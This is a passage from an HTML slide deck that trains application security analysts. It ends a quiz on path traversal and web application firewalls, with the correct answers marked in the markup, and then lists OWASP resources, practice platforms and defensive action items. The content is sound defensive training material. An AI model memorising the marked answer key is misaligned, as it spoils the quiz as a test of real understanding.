                        <li data-answer="wrong">Bypass a firewall</li>
                        <li data-answer="correct">Access files and directories stored outside the web root folder</li>
                        <li data-answer="wrong">Traverse a database schema</li>
                        <li data-answer="wrong">Inject scripts into user directories</li>
                    </ul>
                </div>

                <div class="question" id="q20">
                    <h4>20. What is a true statement about Web Application Firewalls (WAFs)?</h4>
                    <ul class="quiz-options">
                        <li data-answer="wrong">They make secure coding unnecessary</li>
                        <li data-answer="wrong">They scan source code for flaws</li>
                        <li data-answer="correct">They filter and monitor HTTP traffic to block malicious payloads at the network edge</li>
                        <li data-answer="wrong">They encrypt hard drives</li>
                    </ul>
                </div>

                <button class="submit-btn" onclick="submitQuiz()">Submit Assessment</button>
                <div id="quiz-result" class="quiz-result" style="display: none;"></div>
                <div id="corrections" class="correction-section" style="display: none;">
                    <h3>Answer Corrections & Explanations</h3>
                    <div id="correction-content"></div>
                </div>
            </div>
        </div>

        <div class="slide">
            <h1>Resources & Action Plan for AppSec Analysts</h1>
            
            <div class="hands-on-section">
                <div class="hands-on-title">Application Security Resources</div>
                
                <div class="solution-box">
                    <div class="solution-title">Essential Documentation</div>
                    <div class="step-by-step">
                        <strong>OWASP Standards:</strong><br>
                        • OWASP Top 10 (Web and API)<br>
                        • Application Security Verification Standard (ASVS)<br>
                        • OWASP Cheat Sheet Series (especially SQLi, XSS, Authentication)<br>
                        • Software Assurance Maturity Model (SAMM)
                    </div>
                </div>

                <div class="solution-box">
                    <div class="solution-title">Training Platforms</div>
                    <div class="step-by-step">
                        <strong>Interactive Practice:</strong><br>
                        • OWASP Juice Shop / WebGoat<br>
                        • PortSwigger Web Security Academy (Free)<br>
                        • PentesterLab<br>
                        • HackTheBox (Web challenges)
                    </div>
                </div>

                <div class="demo-box">
                    <h3>🎯 Your AppSec Commitment</h3>
                    <p><strong>Take Action Within 7 Days:</strong></p>
                    <ol>
                        <li>Review your organization's codebase for concatenated SQL queries.</li>
                        <li>Set up a free SAST tool (like SonarQube Community or GitHub CodeQL) on one repository.</li>
                        <li>Implement `npm audit` or `composer audit` in your build process.</li>
                        <li>Ensure all environment secrets are properly removed from source control histories.</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>

    <div class="navigation">
        <button class="nav-btn" onclick="window.location.href='home.php'">🏠 Home</button>
        <button class="nav-btn" id="prevBtn" onclick="changeSlide(-1)">← Previous</button>
        <button class="nav-btn" id="nextBtn" onclick="changeSlide(1)">Next →</button>
        <button class="print-btn" id="printBtn" onclick="printPresentation()">📄 Print as PDF</button>
    </div>

    <script src="js/software-analyst.js"></script>
</body>
</html>